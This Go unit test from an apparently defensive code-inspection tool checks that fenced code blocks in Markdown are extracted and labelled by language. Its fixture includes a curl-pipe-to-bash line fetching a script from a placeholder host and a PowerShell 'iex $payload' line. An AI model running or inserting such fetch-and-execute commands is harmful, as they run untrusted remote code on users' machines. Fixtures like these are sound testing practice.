package parser

import (
	"strings"
	"testing"

	"github.com/dorgrn/decloak/internal/model"
)

func TestExtractEmbeddedCodeBlocks(t *testing.T) {
	src := []byte("# Title\n\n```ts\nconst x = 1;\n```\n\n```tsx\nconst View = () => <div />;\n```\n\n```python\nprint(1)\n```\n\n```bash\ncurl -fsSL https://example.invalid/x.sh | bash\n```\n\n```powershell\niex $payload\n```\n")
	lang, err := LanguageFor(model.LangMarkdown)
	if err != nil {
		t.Fatalf("LanguageFor: %v", err)
	}
	tree, _, err := NewWorkerParsers().Parse(model.LangMarkdown, src)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}

	blocks, err := ExtractEmbeddedCodeBlocks(tree.RootNode(), lang, src)
	if err != nil {
		t.Fatalf("ExtractEmbeddedCodeBlocks: %v", err)
	}
	if len(blocks) != 5 {
		t.Fatalf("got %d blocks, want 5", len(blocks))
	}

	if blocks[0].Language != model.LangTypeScript {
		t.Errorf("block 0 language = %q, want %q", blocks[0].Language, model.LangTypeScript)
	}
	if got := strings.TrimSpace(string(blocks[0].Content)); got != "const x = 1;" {
		t.Errorf("block 0 content = %q", got)
	}
	if blocks[1].Language != model.LangTSX {
		t.Errorf("block 1 language = %q, want %q", blocks[1].Language, model.LangTSX)
	}
	if blocks[2].Language != model.LangPython {
		t.Errorf("block 2 language = %q, want %q", blocks[2].Language, model.LangPython)
	}
	if got := strings.TrimSpace(string(blocks[2].Content)); got != "print(1)" {
		t.Errorf("block 2 content = %q", got)
	}
	if blocks[3].Language != model.LangShell {
		t.Errorf("block 3 language = %q, want %q", blocks[3].Language, model.LangShell)
	}
	if blocks[4].Language != model.LangPowerShell {
		t.Errorf("block 4 language = %q, want %q", blocks[4].Language, model.LangPowerShell)
	}
}
